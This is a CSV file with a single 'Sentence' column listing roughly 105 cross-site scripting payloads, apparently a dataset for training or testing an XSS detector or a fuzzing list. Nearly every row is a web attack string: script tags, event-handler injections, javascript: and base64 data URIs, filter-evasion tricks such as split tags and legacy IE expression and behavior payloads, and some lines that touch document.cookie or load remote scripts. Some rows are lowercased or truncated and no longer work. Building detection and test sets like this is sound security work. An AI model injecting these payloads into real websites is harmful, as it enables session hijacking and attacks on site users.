,Sentence
0,confirm(2)>/
1,open()>
2,location=?javascript:alert(1)>click
3,<svg><script>alert(/1/)</script>
4,</script><script>alert(1)</script>
5,5rt(0);'>rhainfosec
6,">""<img src=&{document.cookie=true;};>"
7,">""<img src=""mocha:document.cookie=true;"">"
8,">""<img src=""livescript:document.cookie=true;"">"
9,"""data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4="">"
10,prompt(1);>
11,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""crosssitescripting"")>"
12,<iframe src=http://vulnerability-lab.com/index.html <
13,"<table background=""javascript:alert('crosssitescripting')"">"
14,"<table><td background=""javascript:alert('crosssitescripting')"">"
15,"<bgsound src=""javascript:alert('crosssitescripting');"">"
16,"<br size=""&{alert('crosssitescripting')}"">"
17,"<a href=""http://server.com/"">crosssitescripting</a>"
18,"<a href=""http://www.google.com"">crosssitescripting</a>"
19,"<a href=""http://1113982867/"">crosssitescripting</a>"
20,"<a href=""javascript:document.location='http://www.vulnerability-lab.com/'"">crosssitescripting</a>"
21,"<base href=""javascript:alert('crosssitescripting');//"">"
22,""";alert('crosssitescripting');//"
23,"<input type=""image"" src=""javascript:alert('crosssitescripting');"">"
24,"<crosssitescripting style=""behavior: url(crosssitescripting.htc);"">"
25,scriptalert(crosssitescripting)/script
26,"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))"">"
27,"<crosssitescripting style=""crosssitescripting:expression(alert('crosssitescripting'))""> exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*""); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(""crosssitescripting""))'>"
28,"<html xmlns:crosssitescripting><?import namespace=""crosssitescripting"" implementation=""http://ha.ckers.org/crosssitescripting.htc""><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>"
29,"<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('crosssitescripting');"">]]>"
30,</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
31,"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:alert('crosssitescripting')""></b></i></xml>"
32,"<span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
33,"<xml src=""crosssitescriptingtest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>"
34,"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">"
35,"<?import namespace=""t"" implementation=""#default#time2"">"
36,"<t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>alert(""crosssitescripting"")</script>"">"
37,</body></html>
38,"<script src=""http://vulnerability-lab.com/crosssitescripting.jpg""></script>"
39,"<? echo('<scr)';echo('ipt>alert(""crosssitescripting"")</script>'); ?>"
40,"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">"
41,<iframe src=http://test.de>
42,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""xss"")>"
43,><img id=xss src=x onerror=alert(xss);>
44,";!--""<xss>=&{()}"""
45,"<img id=xss src=""javascript:alert('xss');"">"
46,<img id=xss src=javascript:alert('xss')>
47,"<img id=xss src=javascript:alert(""xss"")>"
48,"<img id=xss src=`javascript:alert(""'xss'"")`>"
49,"<img id=xss src=""jav ascript:alert('xss');"">"
50,"<img id=xss src=javascript:alert(""xss"")>"";' >"
51,"<img id=xss src="" javascript:alert('xss');"">"
52,"<<script>alert(""xss"");//<</script>"
53,""";alert('xss');//"
54,<img id=xss src='javascript:alert('xss')
55,<script>alert(/xss/.source)</script>
56,"<body background=""javascript:alert('xss')"">"
57,"</title><script>alert(""xss"");</script>"
58,"<input type=""image"" id=xss src=""javascript:alert('xss');"">"
59,<script>alert('xssya')</script>
60,"<script>alert(""xssya"")</script>"
61,1<script>prompt(999691)</script>
62,//1<script>prompt(919397)</script>
63,"""<script>alert('xssya')</script>"
64,"'""</script><script>alert('xssya')</script>"
65,1<script >prompt(962477)</script>
66,<script>alert(1);</script>
67,"""><script>alert('xssya')</script>"
68,"'';!--""<xss>=&{()}"
69,alert(1)>
70,""";alert(1)//"
71,<script>alert('xssya');</script>
72,"'""--></style></script><script>alert('xss')</script>"
73,<scr<script>ipt>alert(1)</scr<script>ipt>
74,javascript:alert(1)//
75,<script>confirm(0);</script>
76,"""x:alert"" onerror=""eval(src+'(0)')"">"
77,"data:text/html,<script>alert(0)</script>"
78,<body/onhashchange=alert(1)><a+href=#>clickit
79,<img+src=x+onerror=prompt(1);>
80,<video+src=x+onerror=prompt(1);>
81,"""javascript:alert(2)"">"
82,""";alert('xss)//"
83,"<img """"""><script>alert(""xss"")</script>"">"
84,x onfocus=alert(1)>
85,"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">"
86,"""javascript:alert(1)""><input type=submit>"
87,"data:text/html, type=image>"
88,<isindex action=j a vas c r ipt:alert(1) type=image>
89,confirm(2)>
90,"""http://www.google.com./"">xss</a>"
91,"""test""></form><button form=""test"" formaction=""javascript:alert(1)"">x</button>"
92,write(1) autofocus>
93,write(1) autofocus><input autofocus>
94,javascript:alert(1)//></video>
95,alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
96,test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>
97,"""alert(1)"">"
98,"""alert(1)""><source></source></video>"
99,"""javascript:alert(1)"">x</button>"
100,alert(1)><input autofocus>
101,"""javascript:alert(1)"">clickme</math>"
102,"""import"" href=""test.svg"" />"
103,"<iframe srcdoc=""<img src=x:x onerror=alert(1)>"" />"
104,"""x""><img onerror=""alert(1)""></picture>"
